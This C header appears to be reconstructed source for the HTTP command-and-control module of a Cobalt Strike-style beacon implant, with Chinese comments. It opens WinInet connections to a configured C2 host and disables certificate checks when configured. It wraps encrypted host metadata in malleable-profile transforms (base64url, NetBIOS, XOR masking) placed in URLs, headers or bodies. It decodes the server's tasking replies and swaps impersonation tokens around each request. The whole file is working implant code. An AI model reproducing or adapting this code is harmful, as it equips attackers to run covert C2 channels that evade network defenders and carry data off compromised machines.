#pragma once
#include <Windows.h>
#include <WinInet.h>
#include "tomcrypt.h"
#include "data_deal.h"

//小心句柄泄露
DWORD dwFlags;
HANDLE TokenHandle;
HANDLE hInternet;
DWORD_PTR dwContext;
HANDLE hConnect;

static const char* const codes_base64url = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";

static int _base64_encode_internal(const unsigned char* in, unsigned long inlen,
	unsigned char* out, unsigned long* outlen,
	const char* codes, int pad)
{
	unsigned long i, len2, leven;
	unsigned char* p;

	/* valid output size ? */
	len2 = 4 * ((inlen + 2) / 3);
	if (*outlen < len2 + 1) {
		*outlen = len2 + 1;
		return CRYPT_BUFFER_OVERFLOW;
	}
	p = out;
	leven = 3 * (inlen / 3);
	for (i = 0; i < leven; i += 3) {
		*p++ = codes[(in[0] >> 2) & 0x3F];
		*p++ = codes[(((in[0] & 3) << 4) + (in[1] >> 4)) & 0x3F];
		*p++ = codes[(((in[1] & 0xf) << 2) + (in[2] >> 6)) & 0x3F];
		*p++ = codes[in[2] & 0x3F];
		in += 3;
	}
	/* Pad it if necessary...  */
	if (i < inlen) {
		unsigned a = in[0];
		unsigned b = (i + 1 < inlen) ? in[1] : 0;

		*p++ = codes[(a >> 2) & 0x3F];
		*p++ = codes[(((a & 3) << 4) + (b >> 4)) & 0x3F];
		if (pad) {
			*p++ = (i + 1 < inlen) ? codes[(((b & 0xf) << 2)) & 0x3F] : '=';
			*p++ = '=';
		}
		else {
			if (i + 1 < inlen) *p++ = codes[(((b & 0xf) << 2)) & 0x3F];
		}
	}

	/* append a NULL byte */
	*p = '\0';

	/* return ok */
	*outlen = (unsigned long)(p - out);
	return CRYPT_OK;
}

int base64url_encode(const unsigned char* in, unsigned long inlen,
	unsigned char* out, unsigned long* outlen)
{
	return _base64_encode_internal(in, inlen, out, outlen, codes_base64url, 0);
}


BOOL Close_token_fake()
{
	BOOL result = 0;

	if (TokenHandle)
		result = RevertToSelf();
	return result;
}

BOOL restore_token_fake()
{

	BOOL result;
	result = (BOOL)TokenHandle;
	if (TokenHandle)
		result = ImpersonateLoggedOnUser(TokenHandle);
	return result;
}

BOOL set_winit_http(LPCSTR lpszServerName, INTERNET_PORT nServerPort, LPCSTR lpszAgent)
{
	unsigned __int16 v3;
	int v4;
	int v5;
	void* v6;
	void* v7;
	char* v8;
	char* v9;
	char* v11;
	unsigned int v12;
	unsigned int v13;
	int Buffer;

	Buffer = 240000;
	Close_token_fake();
	dwFlags = (get_short(1) & 8) != 8 ? 0x84400200 : 0x84C03200;
	if (get_short(50) == 1)
		dwFlags |= 0x80000u;
	v3 = get_short(35);
	if (v3)
	{
		v4 = v3 - 1;
		if (!v4)
		{
			v6 = InternetOpenA(lpszAgent, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
			goto LABEL_8;
		}
		v5 = v4 - 1;
		if (!v5)
		{
			v6 = InternetOpenA(lpszAgent, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0);
			goto LABEL_8;
		}
		if (v5 != 2)
			goto LABEL_9;
	}
	v11 = get_str(32);
	v6 = InternetOpenA(lpszAgent, INTERNET_OPEN_TYPE_PROXY, v11, 0, 0);
LABEL_8:
	hInternet = v6;
LABEL_9:
	InternetSetOptionA(hInternet, 5, &Buffer, 4);
	InternetSetOptionA(hInternet, 6, &Buffer, 4);
#include "GetLastErrorEx.h"
	hConnect = InternetConnectA(hInternet, lpszServerName, nServerPort, 0, 0, INTERNET_SERVICE_HTTP, 0, dwContext);
	if (hConnect == NULL)
	{
		GetLastErrorEx("HttpOpenRequestA");
	}
	if (get_short(35) != 4)
		return restore_token_fake();
	v12 = get_str_config_len(33);
	v8 = get_str(33);
	InternetSetOptionA(hConnect, 0x2B, v8, v12);
	v13 = get_str_config_len(34);
	v9 = get_str(34);
	InternetSetOptionA(hConnect, 0x2C, v9, v13);
	return restore_token_fake();
}

void init_struc2(int size, struc_2* struc2)
{
	signed int v2;
	struc_1* struc1;
	DWORD_PTR* v4;
	DWORD_PTR* v5;
	DWORD_PTR* v6;
	DWORD_PTR* v7;
	DWORD_PTR* v8;
	DWORD_PTR* v9;
	int v10;
	int v11;
	int v12;
	struc_1* v13;
	struc_1* v14;

	v2 = 3 * size;
	struc2->encrypt_Metadata_size = v2;
	if (v2 < 8192)
		struc2->encrypt_Metadata_size = 8192;
	struc1 = (struc_1*)init_struc1_malloc_Memory(3 * (struc2->encrypt_Metadata_size + 1024));
	struc2->p_struc_1 = struc1;
	v4 = (DWORD_PTR*)get_ptr_struc1_index2_OffsetN(struc1, 1024);
	v14 = struc2->p_struc_1;
	struc2->lpszHeaders = v4;
	v5 = (DWORD_PTR*)get_ptr_struc1_index2_OffsetN(v14, 1024);
	v13 = struc2->p_struc_1;
	struc2->field_1 = v5;
	v6 = (DWORD_PTR*)get_ptr_struc1_index2_OffsetN(v13, 1024);
	v12 = struc2->encrypt_Metadata_size;
	struc2->http_get_url = v6;
	v7 = (DWORD_PTR*)get_ptr_struc1_index2_OffsetN(struc2->p_struc_1, v12);
	v11 = struc2->encrypt_Metadata_size;
	struc2->lpOptional = v7;
	v8 = (DWORD_PTR*)get_ptr_struc1_index2_OffsetN(struc2->p_struc_1, v11);
	v10 = struc2->encrypt_Metadata_size;
	struc2->encrypt_Metadata = v8;
	v9 = (DWORD_PTR*)get_ptr_struc1_index2_OffsetN(struc2->p_struc_1, v10);
	struc2->dwOptionalLength = 0;
	struc2->Encoding_encrypt_Metadata = v9;
}


int NetBIOS_Encode(char* out, char key, char* in, int a4, int in_size)
{
	int v5;
	unsigned __int8 v7;
	int i;
	v5 = 0;
	for (i = 0; v5 < a4; i += 2)
	{
		if (i >= in_size)
		{
			break;
		}
		v7 = in[v5];
		out[i] = key + (v7 >> 4);
		out[i + 1] = key + (v7 & 0xF);
		++v5;
	}
	return i;//返回长度
}

unsigned int xor_encode(char* a1, unsigned int a3, char* a4, unsigned int a5)
{
	unsigned int v4;
	char* v5;
	char* v7;
	unsigned int v8;
	char* v9;
	char v10;

	v4 = a3 + 4;
	v5 = a1;
	if (a3 + 4 > a5)
	{
		return 0;
	}
	*(DWORD*)a1 = random_dword_4();
	v7 = v5 + 4;
	v8 = 0;
	if (!a3)
	{
		return v4;
	}
	do
	{
		v9 = &v7[v8];
		v10 = a4[v8] ^ a1[v8 & 3];
		++v8;
		*v9 = v10;
	} while (v8 < a3);
	return a3 + 4;
}
int encode_Metadata(char* http_get_client_512, struc_2* struc2, char* enc_Metadata, int enc_Metadata_size, void* a5, size_t a6)
{
	int result;
	size_t v7;
	size_t v8;
	DWORD_PTR* v9;
	struc_2* v10;
	DWORD_PTR* v11;
	DWORD_PTR* v12;
	unsigned __int8* v13;
	struc_2* v14;
	DWORD_PTR* v15;
	DWORD_PTR* v16;
	u_long v17;
	size_t v18;
	struc_2* v19;
	size_t v20;
	DWORD_PTR* v21;
	DWORD_PTR* v22;
	size_t v23;
	DWORD_PTR* v24;
	const void* v25;
	DWORD_PTR* v26;
	size_t v27;
	size_t Size;
	void* Encoding_encrypt_Metadata_size;
	char* c2_http_host_Config;
	int v31;
	struc_1 a1;
	char Src[1024];

	Src[0] = 0;
	memset(&Src[1], 0, 1023u);
	Size = 0;
	v31 = 0;
	c2_http_host_Config = get_str(54);
	init_struc1(&a1, http_get_client_512, 1024);
	while (2)
	{
		result = get_int_struc1_index2(&a1);        // 取出类型
		switch (result)
		{
		case 0:
			if (v31)
			{
				return result;
			}
			if (!c2_http_host_Config)
			{
				return result;
			}
			result = strlen(c2_http_host_Config);
			if (!result)
			{
				return result;
			}
			result = _snprintf(
				(char* const)struc2->Encoding_encrypt_Metadata,
				0x400u,
				"%s%s\r\n",
				(const char*)struc2->lpszHeaders,
				c2_http_host_Config);
			memcpy(struc2->lpszHeaders, struc2->Encoding_encrypt_Metadata, 0x400u);
			return result;
		case 1:
			memset(Src, 0, sizeof(Src));
			v7 = copy_struc_1_Nsize_src(Src, &a1, 1024);
			memcpy((char*)struc2->encrypt_Metadata + Size, Src, v7);
			Size += &Src[strlen(Src) + 1] - &Src[1];
			continue;
		case 2:
			memset(Src, 0, sizeof(Src));
			v8 = copy_struc_1_Nsize_src(Src, &a1, 1024);
			v9 = struc2->Encoding_encrypt_Metadata;
			memcpy(v9, Src, v8);
			Encoding_encrypt_Metadata_size = struc2->encrypt_Metadata;
			memcpy((char*)v9 + strlen(Src), Encoding_encrypt_Metadata_size, Size);
			Size += strlen(Src);
			memset(Encoding_encrypt_Metadata_size, 0, struc2->encrypt_Metadata_size);
			memcpy(Encoding_encrypt_Metadata_size, v9, Size);
			continue;
		case 3:
			v10 = struc2;
			Encoding_encrypt_Metadata_size = (void*)struc2->encrypt_Metadata_size;
			result = base64_encode(
				(const unsigned char*)struc2->encrypt_Metadata,
				Size,
				(char*)struc2->Encoding_encrypt_Metadata,
				(unsigned long*)&Encoding_encrypt_Metadata_size);
			if (!result)
			{
				goto LABEL_6;
			}
			return result;
		case 4:
			memcpy(struc2->lpOptional, struc2->encrypt_Metadata, Size);
			struc2->dwOptionalLength = Size;
			continue;
		case 5:
			memset(Src, 0, sizeof(Src));
			copy_struc_1_Nsize_src(Src, &a1, 1024);
			v14 = struc2;
			v15 = struc2->field_1;
			v26 = struc2->encrypt_Metadata;
			if (*(BYTE*)v15)
			{
				_snprintf(
					(char* const)struc2->Encoding_encrypt_Metadata,
					0x400u,
					"%s&%s=%s",
					(const char*)v15,
					Src,
					(const char*)v26);
			}
			else
			{
				_snprintf((char* const)struc2->Encoding_encrypt_Metadata, 0x400u, "?%s=%s", Src, v26);
			}
			goto LABEL_13;
		case 6:
			memset(Src, 0, sizeof(Src));
			copy_struc_1_Nsize_src(Src, &a1, 1024);
			v14 = struc2;
			_snprintf(
				(char* const)struc2->Encoding_encrypt_Metadata,
				0x400u,
				"%s%s: %s\r\n",
				(const char*)struc2->lpszHeaders,
				Src,
				(const char*)struc2->encrypt_Metadata);
			goto LABEL_15;
		case 7:
			v17 = get_int_struc1_index2(&a1);
			if (v17)
			{
				if (v17 != 1)
				{
					continue;
				}
				v18 = a6;
				v27 = a6;
				v25 = a5;
			}
			else
			{
				v18 = enc_Metadata_size;
				v27 = enc_Metadata_size;
				v25 = enc_Metadata;
			}
			memcpy(struc2->encrypt_Metadata, v25, v27);// 将加密的元数据复制到结构体2中的指定位置
			Size = v18;
			continue;
		case 8:
			v19 = struc2;
			v20 = NetBIOS_Encode(
				(char*)struc2->Encoding_encrypt_Metadata,
				'a',
				(char*)struc2->encrypt_Metadata,
				Size,
				struc2->encrypt_Metadata_size);
			goto LABEL_22;
		case 9:
			memset(Src, 0, sizeof(Src));
			copy_struc_1_Nsize_src(Src, &a1, 1024);
			v14 = struc2;
			v22 = struc2->field_1;
			if (*(BYTE*)v22)
			{
				_snprintf((char* const)struc2->Encoding_encrypt_Metadata, 0x400u, "%s&%s", v22, Src);
			}
			else
			{
				_snprintf((char* const)struc2->Encoding_encrypt_Metadata, 0x400u, "?%s", Src);
			}
		LABEL_13:
			v16 = v14->field_1;
			goto LABEL_35;
		case 10:
			memset(Src, 0, sizeof(Src));
			copy_struc_1_Nsize_src(Src, &a1, 1024);
			v14 = struc2;
			_snprintf(
				(char* const)struc2->Encoding_encrypt_Metadata,
				0x400u,
				"%s%s\r\n",
				(const char*)struc2->lpszHeaders,
				Src);
		LABEL_15:
			v16 = v14->lpszHeaders;
			goto LABEL_35;
		case 11:
			v19 = struc2;
			v20 = NetBIOS_Encode(
				(char*)struc2->Encoding_encrypt_Metadata,
				'A',
				(char*)struc2->encrypt_Metadata,
				Size,
				struc2->encrypt_Metadata_size);
		LABEL_22:
			v21 = v19->encrypt_Metadata;
			Size = v20;
			memset(v21, 0, v19->encrypt_Metadata_size);
			memcpy(v21, v19->Encoding_encrypt_Metadata, Size);
			continue;
		case 12:
			v14 = struc2;
			_snprintf(
				(char* const)struc2->Encoding_encrypt_Metadata,
				0x400u,
				"%s%s",
				(const char*)struc2->http_get_url,
				(const char*)struc2->encrypt_Metadata);
			v16 = struc2->http_get_url;
			goto LABEL_35;
		case 13:
			v12 = struc2->Encoding_encrypt_Metadata;
			v13 = (unsigned __int8*)struc2->encrypt_Metadata;
			Encoding_encrypt_Metadata_size = (void*)struc2->encrypt_Metadata_size;
			result = base64url_encode((const unsigned char*)v13, (unsigned long)Size, (unsigned char*)v12, (unsigned long*)&Encoding_encrypt_Metadata_size);// base64

			if (result)
			{
				return result;
			}
			v10 = struc2;
		LABEL_6:
			v11 = v10->encrypt_Metadata;
			Size = (size_t)Encoding_encrypt_Metadata_size;
			memset(v11, 0, v10->encrypt_Metadata_size);
			memcpy(v11, v10->Encoding_encrypt_Metadata, (size_t)Encoding_encrypt_Metadata_size);
			continue;
			return result;
		case 15:
			v23 = xor_encode(
				(char*)struc2->Encoding_encrypt_Metadata,
				Size,
				(char*)struc2->encrypt_Metadata,
				struc2->encrypt_Metadata_size); // xor
			v24 = struc2->encrypt_Metadata;
			Size = v23;
			memset(v24, 0, struc2->encrypt_Metadata_size);
			memcpy(v24, struc2->Encoding_encrypt_Metadata, Size);
			continue;
		case 16:
			memset(Src, 0, sizeof(Src));
			copy_struc_1_Nsize_src(Src, &a1, 1024);
			if (c2_http_host_Config && strlen(c2_http_host_Config))
			{
				v14 = struc2;
				_snprintf(
					(char* const)struc2->Encoding_encrypt_Metadata,
					0x400u,
					"%s%s\r\n",
					(const char*)struc2->lpszHeaders,
					c2_http_host_Config);
				v31 = 1;
			}
			else
			{
				_snprintf(
					(char* const)struc2->Encoding_encrypt_Metadata,
					0x400u,
					"%s%s\r\n",
					(const char*)struc2->lpszHeaders,
					Src);
				v14 = struc2;
			}
			v16 = v14->lpszHeaders;
		LABEL_35:
			memcpy(v16, v14->Encoding_encrypt_Metadata, 0x400u);
			continue;
		default:
			continue;
		}
	}
}

void __stdcall fnInternetCallback(HINTERNET hInternet, DWORD_PTR dwContext, DWORD dwInternetStatus, LPVOID lpvStatusInformation, DWORD dwStatusInformationLength)
{
	char* v5;

	if (dwInternetStatus == 21)
	{
		v5 = get_str(59);
		HttpAddRequestHeadersA(hInternet, v5, 0xFFFFFFFF, 0x80000000);
	}
}

char* set_http_opt(HINTERNET hInternet)
{
	char* result;
	DWORD dwBufferLength;
	int Buffer;

	if ((get_short(1) & 8) != 0)
	{
		dwBufferLength = 4;
		InternetQueryOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &Buffer, &dwBufferLength);
		Buffer |= 0x3380;
		InternetSetOptionA(hInternet, INTERNET_OPTION_SECURITY_FLAGS, &Buffer, 4);
	}
	result = get_str(59);                         // headers_remove
	if (result)
		result = (char*)InternetSetStatusCallback(hInternet, fnInternetCallback);
	return result;
}

int is_http_200(HINTERNET hRequest)
{
	int result;
	char Buffer[256];
	DWORD dwBufferLength;

	dwBufferLength = 256;
	result = HttpQueryInfoA(hRequest, 0x13u, Buffer, &dwBufferLength, 0);
	if (result)
		result = atoi(Buffer) == 200;
	return result;
}



unsigned int xor_decode(int insize, char* in, char* out, unsigned int a4)
{
	unsigned int v7;
	unsigned int v8;
	int v9;
	char* v10;
	char v11;

	if (insize - 4 > a4)
	{
		return 0;
	}
	v7 = insize - 4;
	v8 = 0;
	if (!v7)
	{
		return v7;
	}
	v9 = in + 4 - out;
	do
	{
		v10 = &out[v8];
		v11 = out[v8 + v9] ^ in[v8 & 3];
		++v8;
		*v10 = v11;
	} while (v8 < v7);
	return v7;
}

int base64url_decode(unsigned int inlen, char* in, unsigned int a3, char* out, DWORD* outlen)
{
	unsigned int i;
	char v6;

	for (i = 0; i < inlen; ++i)
	{
		v6 = in[i];
		if (v6 == 95)
		{
			in[i] = 47;
		}
		else if (v6 == 45)
		{
			in[i] = 43;
		}
	}
	while (1)
	{
		if ((inlen & 3) == 0)
			return base64_decode((const char*)in, inlen, (unsigned char*)out, outlen);
		if (inlen > a3)
			break;
		in[inlen++] = 61;
	}
	return 6;
}

int NetBIOS_decode(char* a1, char a2, int a3, int a4, int a5)
{
	int i;
	int v7;
	char v8;

	if (a3 % 2 == 1)
	{
		return 0;
	}
	for (i = 0; i < a3; *(BYTE*)(v7 + a4) = v8)
	{
		v7 = i / 2;
		if (i / 2 >= a5)
		{
			break;
		}
		v8 = a1[i + 1] + 16 * a1[i] - 17 * a2;
		i += 2;
	}
	return a3 / 2;
}

DWORD decode_metadata(void* Metadata, size_t metadata_size, char* http_get_server_output, int output_size)
{
	signed int v4;
	char* result;
	char* v7;
	int v8;
	int v9;
	int v10;
	int v11;
	int v12;
	int v13;
	size_t v14;
	char v15;
	int v16;
	int v17;
	int v18;
	struc_1 struc1;
	size_t Size;

	v4 = metadata_size;
	result = (char*)malloc(metadata_size);
	v7 = result;
	if (!result)
	{
		return 0;
	}

	init_struc1(&struc1, http_get_server_output, 1024);
	while (1)
	{
		while (1)
		{
			while (1)
			{
				v8 = get_int_struc1_index2(&struc1);
				if (v8 <= 8)
					break;
				v12 = v8 - 11;
				if (!v12)
				{
					v18 = output_size;
					v17 = (int)v7;
					v16 = v4;
					v15 = 'A';
					goto LABEL_24;//跳转NetBIOS解密大A
				}
				v13 = v12 - 2;
				if (v13)
				{
					if (v13 == 2)
					{
						*((BYTE*)Metadata + v4) = 0;
						v14 = xor_decode(v4, (char*)Metadata, v7, output_size);// xor
						goto LABEL_25;
					}
				}
				else
				{
					Size = output_size;
					*((BYTE*)Metadata + v4) = 0;
					v11 = base64url_decode(v4, (char*)Metadata, output_size, v7, (DWORD*)&Size);// baseurl解密
				LABEL_10:
					if (v11)
						goto LABEL_15;
					v4 = Size;
					memcpy(Metadata, v7, Size);
				}
			}
			if (v8 == 8)
				break;
			if (!v8)
				goto LABEL_16;
			v9 = v8 - 1;
			if (v9)
			{
				v10 = v9 - 1;
				if (v10)
				{
					if (v10 == 1)
					{
						*((BYTE*)Metadata + v4) = 0;
						Size = output_size;
						v11 = base64_decode((const  char*)Metadata, v4, (unsigned char*)v7, (unsigned long*)&Size);// base解密
						goto LABEL_10;
					}
				}
				else
				{
					Size = get_int_struc1_index2(&struc1);
					if ((int)Size > v4)
						goto LABEL_15;
					memcpy(v7, Metadata, v4);
					v4 -= Size;
					memcpy(Metadata, &v7[Size], v4);
				}
			}
			else
			{
				v4 -= get_int_struc1_index2(&struc1);
				if (v4 < 0)
					goto LABEL_15;
			}
		}
		v18 = output_size;
		v17 = (int)v7;
		v16 = v4;
		v15 = 'a';//NetBIOS Encode 'a'
	LABEL_24:
		*((BYTE*)Metadata + v4) = 0;
		v14 = NetBIOS_decode((char*)Metadata, v15, v16, v17, v18);//NetBIOS解密

	LABEL_25:
		v4 = v14;
		if (!v14)
			break;
		memcpy(Metadata, v7, v14);
		*((BYTE*)Metadata + v4) = 0;
	}
LABEL_15:
	v4 = 0;
LABEL_16:
	free(v7);
	return v4;
}



DWORD send_Metadata(char* http_get_url, void* Metadata, int output_size)
{
	char* http_get_client;
	DWORD result;
	char* http_get_server_output;
	size_t metadata_size;
	int v3 = 0;

	CHAR szObjectName[1024];
	memset(szObjectName, 0, 1024);

	LPCSTR lpszAcceptTypes[2];
	lpszAcceptTypes[0] = "*/*";
	lpszAcceptTypes[1] = 0;

	struc_2 struc2;
	memset(&struc2, 0, sizeof(struc2));

	init_struc2(Global_encryption_Metadata_size, &struc2);// 初始化一下结构体2中的一些地方
	_snprintf((char*)struc2.http_get_url, 1024, "%s", http_get_url);

	http_get_client = get_str(12);            // .http-get.client
	encode_Metadata(http_get_client, &struc2, Global_encryption_Metadata, Global_encryption_Metadata_size, 0, 0);//格式化包装元数据

	if ((char*)struc2.field_1 + strlen((const char*)struc2.field_1) + 1 == (char*)struc2.field_1 + 1)
	{
		_snprintf(szObjectName, 1024, "%s", (const char*)struc2.http_get_url);
	}
	else
	{
		_snprintf(szObjectName, 1024, "%s%s", (const char*)struc2.http_get_url, (const char*)struc2.field_1);// field_1大概是url的参数之类的？
	}
#include "GetLastErrorEx.h"
	char* Request_Method = get_str(26);// .http-get.verb 确定是get还是post
	HINTERNET hRequest = HttpOpenRequestA(hConnect, Request_Method, szObjectName, 0, 0, lpszAcceptTypes, dwFlags, dwContext);
	if (hRequest == NULL)
	{
		GetLastErrorEx("HttpOpenRequestA");
	}
	set_http_opt(hRequest);

	HttpSendRequestA(
		hRequest,
		(LPCSTR)struc2.lpszHeaders,
		strlen((const char*)struc2.lpszHeaders),
		struc2.lpOptional,
		struc2.dwOptionalLength);

	free_struc2_in_struc1(&struc2);                        // 释放struc2中的struc1的内存


	if (!is_http_200(hRequest))
	{
		InternetCloseHandle(hRequest);
		return -1;
	}

	// 调用InternetQueryDataAvailable()查询返回的数据大小
	DWORD dwNumberOfBytesAvailable = 0;
	DWORD dwNumberOfBytesRead = 0;
	size_t a2 = 0;
	if (InternetQueryDataAvailable(hRequest, &dwNumberOfBytesAvailable, 0, 0)
		&& dwNumberOfBytesAvailable
		&& dwNumberOfBytesAvailable < output_size)
	{
		if (!output_size)
		{
			InternetCloseHandle(hRequest);
			return 0;
		}
		do
		{
			metadata_size = a2;
			if (!InternetReadFile(hRequest, (char*)Metadata + a2, 0x1000, &dwNumberOfBytesRead)) {
				break;
			}
			if (!dwNumberOfBytesRead) {
				break;
			}
			metadata_size += dwNumberOfBytesRead;
			a2 = metadata_size;
		} while (metadata_size < output_size);

		if (metadata_size >= output_size)
		{
			InternetCloseHandle(hRequest);
			return 0;
		}
		InternetCloseHandle(hRequest);
		http_get_server_output = get_str(11);       // .http-get.server.output
		// 根据http_get_server_output对返回内容进行格式化解码
		result = decode_metadata(Metadata, metadata_size, http_get_server_output, output_size);
	}
	else
	{
		InternetCloseHandle(hRequest);
		result = 0;
	}
	return result;
}

DWORD call_send_Metadata(char* http_get_url, void* Metadata, int output_size)
{
	DWORD ret_data_size;

	Close_token_fake();
	ret_data_size = send_Metadata(http_get_url, Metadata, output_size);
	restore_token_fake();
	return ret_data_size;
}



BOOL Close_http_Handle()
{
	Close_token_fake();
	InternetCloseHandle(hConnect);
	InternetCloseHandle(hInternet);
	return restore_token_fake();
}